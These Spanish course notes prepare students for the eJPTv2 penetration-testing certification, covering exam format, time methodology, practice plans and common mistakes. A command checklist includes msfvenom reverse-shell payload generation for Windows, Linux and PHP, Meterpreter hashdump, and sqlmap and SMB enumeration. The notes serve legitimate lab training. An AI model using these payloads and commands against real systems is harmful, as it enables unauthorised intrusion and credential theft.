> [!info] Ficha técnica
> **Programa:** Máster en Ciberseguridad — Evolve Academy
> **Bloque:** 15 — Examen eJPTv2
> **Contenido:** Qué evalúa el examen, cómo estudiarlo, cómo practicar en laboratorios reales, metodología de examen y errores frecuentes

---

## ① Qué debes tener claro antes de empezar a estudiar

El eJPTv2 (eLearnSecurity/INE Junior Penetration Tester) es un examen **100% práctico**: no hay preguntas teóricas sueltas sobre definiciones. Se te da acceso a una red de laboratorio real con varias máquinas Windows y Linux, y un cuestionario de preguntas cuya respuesta solo se puede obtener enumerando y explotando esas máquinas (versiones de servicio, credenciales, hashes, contenido de archivos, flags).

> [!important] Diferencia clave con ISO 27001
> A diferencia del examen ISO 27001, aquí no sirve memorizar: hacen falta horas de práctica real con las manos en el teclado. El máster ya te ha dado la base técnica en los Bloques 2 a 10 — este bloque se centra en cómo convertir esa base en la metodología de examen concreta que necesitas para aprobar con margen de tiempo.

---

## ② Formato y estructura del examen

| Característica | Detalle |
|----------------|---------|
| **Duración** | Varios días de acceso al laboratorio (no se hace en una sola sesión de horas) |
| **Formato de preguntas** | Opción múltiple o de respuesta corta (introducir un dato concreto: una versión, un hash, el contenido de una flag, un nombre de usuario) |
| **Acceso** | VPN a una red de laboratorio aislada con varias máquinas objetivo |
| **Nota de corte** | Normalmente entre el 70-75% de preguntas correctas |
| **Informe** | No se exige entregar un informe formal de auditoría — el examen se aprueba respondiendo correctamente al cuestionario |

---

## ③ Desglose de contenidos por módulo (y cómo repasarlos)

| Módulo | Bloque de apuntes | Detalle |
|--------|-------------------|---------|
| **1. Information Gathering (OSINT)** | Bloque 3 | Dorks, Shodan/Censys, enumeración pasiva |
| **2. Scanning** | Bloques 3 y 5 | Todos los tipos de escaneo, interpretación de puertos filtered/closed/open, scripts NSE |
| **3. Vulnerability Assessment** | Bloque 5 | Uso de escáneres automatizados (Nessus/OpenVAS) para priorizar antes de explotar manualmente |
| **4. Host & Network Penetration Testing** | Bloque 5 completo | Los walkthroughs de máquinas Linux y Windows, con especial atención a los servicios más comunes (SMB, FTP, SSH, HTTP) y sus vectores típicos |
| **5. Explotación con Metasploit** | Bloque 5 | Manejar con soltura msfconsole, búsqueda de exploits, msfvenom para generar payloads, y el manejo de sesiones Meterpreter |
| **6. Post-Exploitation** | Bloques 6 y 7 | Escalada de privilegios Linux/Windows y pivoting: en el examen es habitual que una pregunta requiera moverte de una máquina a otra dentro de la red del laboratorio || **7. Web Application Penetration Testing** | Bloque 4 | OWASP Top 10 con comandos: SQLi con SQLMap y fuzzing de rutas son los vectores que más se repiten en máquinas web del examen |

---

## ④ Checklist de comandos que debes dominar de memoria

No debes tener que "pensar" la sintaxis de estos comandos durante el examen — practica hasta que salgan automática:

### Reconocimiento y escaneo

```bash
nmap -sn 10.10.10.0/24 # descubrimiento de hosts vivos
nmap -p- -sV -oN full_scan.txt <IP> # escaneo completo puertos+versiones
nmap --script vuln <IP> # scripts NSE de detección de vulns
nmap -sU --top-ports 20 <IP> # escaneo UDP básico
```

### Enumeración de servicios comunes

```bash
smbclient -L //<IP>/ -N # shares SMB sin credenciales
enum4linux -a <IP> # enumeración completa SMB/RPC
showmount -e <IP> # exports NFS
snmpwalk -v2c -c public <IP> # SNMP con community por defecto
ftp <IP> # comprobar acceso anónimo
```

### Explotación con Metasploit

```bash
msfconsole
search <servicio o CVE>
use exploit/ruta/del/exploit
set RHOSTS <IP>
set LHOST <TU_IP>
run
```

### Generación de payloads con msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TU_IP> \
 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<TU_IP> \
 LPORT=4444 -f elf -o shell.elf
msfvenom -p php/reverse_php LHOST=<TU_IP> LPORT=4444 -f raw -o shell.php
```

### Post-explotación con Meterpreter

```bash
sysinfo
getuid
hashdump
run post/multi/recon/local_exploit_suggester
background # (o bg) deja la sesión activa sin perderla
```

### Web

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
sqlmap -u "http://<IP>/pagina.php?id=1" --dbs
```

→

---

## ⑤ Metodología de examen: cómo organizar tu tiempo

1. **Primeros 20-30 minutos:** escaneo completo de **TODA** la red del laboratorio (todas las IPs asignadas, todos los puertos) con `nmap -p- -sV`, guardando la salida en un archivo por host (`-oN`). **No explotes todavía nada**

2. **Con los escaneos completos**, responde primero las preguntas de reconocimiento puro ("¿cuántos hosts activos hay?", "¿qué versión de servicio corre en el puerto X del host Y?") — se resuelven sin explotar nada y dan puntos rápidos y seguros

3. **Prioriza las máquinas con vulnerabilidades más evidentes** (versiones muy desactualizadas, servicios con exploits públicos conocidos) antes de las que requieren más trabajo manual

4. **Cada vez que obtengas credenciales o un hash** en una máquina, pruébalo inmediatamente en el resto de servicios y máquinas del laboratorio antes de seguir buscando otra vía — la reutilización de credenciales es uno de los patrones que más se repite en el examen

5. **Documenta sobre la marcha** (usuario, contraseña, hash, ruta de la flag, host) en un archivo de texto simple — no confíes en la memoria, sobre todo si el examen dura varios días con pausas entre sesiones

> [!important] Patrón de eficiencia
> El reconocimiento inicial completo es el patrón que más tiempo ahorra en el examen real. Muchas preguntas se resuelven solo con el escaneo, sin explotar nada.

---

## ⑥ Cómo practicar antes del examen

La teoría de este máster (Bloques 2 a 10) te da la base, pero el eJPT se aprueba con horas de práctica acumulada resolviendo máquinas completas de principio a fin, sin ayuda, y cronometrándote.

### Plan de práctica recomendado

| Semana | Actividad |
|--------|-----------|
| **1-2** | Consolidar fundamentos con guía: resolver 8-10 máquinas "Easy" de Hack The Box o TryHackMe usando write-ups como apoyo la primera vez, y repitiéndolas sin apoyo una segunda vez unos días después. Repasar el Bloque 5 y reproducir tú mismo, comando a comando, los tres walkthroughs completos (thetoppers.htb, Bacine, Granny) sin mirar la solución |
| **3** | Práctica sin red de seguridad: resolver 5-6 máquinas nuevas (Easy/Medium) completamente a ciegas, sin write-up, cronometrando cuánto tardas en cada fase (enumeración, explotación, escalada). Si te atasca más de 45-60 minutos en una fase, consulta brevemente una pista (no la solución completa) y continúa |
| **4** | Simulacro en condiciones de examen: montar un laboratorio con 3-4 máquinas variadas (alguna Windows, alguna Linux, alguna web) y resolverlas en una sesión continua de varias horas, aplicando exactamente la metodología de la sección 15.5 |

---

## ⑦ Recursos de práctica recomendados

| Recurso | Nota |
|---------|------|
| **TryHackMe** — ruta "Jr Penetration Tester" | Progresión guiada muy alineada con el temario del eJPT |
| **Hack The Box** — máquinas Easy y alguna Medium | Especialmente las retiradas (con write-ups disponibles para verificar tu proceso) |
| **Laboratorios propios de INE** | Los más representativos del formato exacto del examen, porque son del mismo proveedor |
| **Laboratorios y walkthroughs ya trabajados en el máster** | Repetirlos sin mirar la solución es una de las formas más eficientes de repasar |

---

## ⑧ Errores frecuentes que hacen perder tiempo o puntos

| Error | Consecuencia |
|-------|-------------|
| No guardar los resultados de Nmap en un archivo (`-oN`) | Obliga a re-escanear si se pierde la sesión de terminal o hay que consultar un dato más tarde |
| Saltar la enumeración completa de puertos (`-p-`) y quedarse solo con los 1000 más comunes | Se pierden servicios en puertos altos donde a menudo está la vulnerabilidad clave |
| No probar credenciales por defecto o reutilizadas entre distintos servicios de la misma máquina | El eJPT premia mucho la reutilización de credenciales encontradas |
| Lanzarse a explotar antes de leer bien la pregunta | Muchas preguntas del examen no requieren explotación completa, basta con un escaneo o una enumeración bien hecha |
| No documentar sobre la marcha | Tener que repetir pasos ya hechos porque no se recuerda una credencial o una ruta encontrada media hora antes |

---

## ⑨ El día (o los días) del examen

1. **Antes de empezar**, confirma que tu conexión VPN al laboratorio es estable — una desconexión a mitad de una sesión de post-explotación puede hacer perder progreso si no habías guardado credenciales o notas

2. **Lee el cuestionario completo** antes de tocar el teclado, para saber qué información necesitas ir recolectando durante el escaneo y la explotación — así no tienes que volver atrás a por un dato que ya tenías delante

3. **Si el examen se extiende varios días**, no dejes todo para el último día: reparte el trabajo, y aprovecha los primeros días para el reconocimiento y la explotación inicial de todas las máquinas, dejando post-explotación y preguntas más complejas para el final con margen de tiempo

4. **Si una máquina concreta te bloquea mucho tiempo**, pasa a otra y responde primero las preguntas que sí puedas resolver — no hay motivo para perder puntos seguros por quedarte atascado en una sola máquina

> [!tip] Gestión del tiempo
> El examen dura varios días. La clave es maximizar el número de preguntas respondidas correctamente, no resolver todas las máquinas. Prioriza preguntas fáciles sobre máquinas difíciles.

→

→

→

→
→



---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../Apuntes/15 - Certificaciones/Certificaciones - ISO 27001 y eJPTv2.md|Certificaciones - ISO 27001 y eJPTv2]] — Linux, Nmap, OSINT
- [[../apuntes Joselu/PREWORK/resumen_clase16.md|resumen_clase16]] — Linux, Nmap, OSINT
- [[../Apuntes/12 - Blue Team y SOC/Blue Team - SOC e Incidentes.md|Blue Team - SOC e Incidentes]] — Linux, Nmap, OSINT
- [[../comandos/Metasploit.md|Metasploit]] — Linux, Nmap, Windows
- [[../apuntes Andres/11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad.md|11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad]] — Linux, Nmap, Windows
- [[BLOQUE 7.md|BLOQUE 7]] — Linux, Nmap, Windows

### 🛠️ Herramientas

- [[comandos/Metasploit|Metasploit]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SQLMap|SQLMap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]

> #blue-team #certificaciones #escalada-privilegios #hack-the-box #linux #metasploit #nmap #normativa #osint #pentest #pivoting #post-explotacion #redes #sqli #sqlmap #ssh #windows
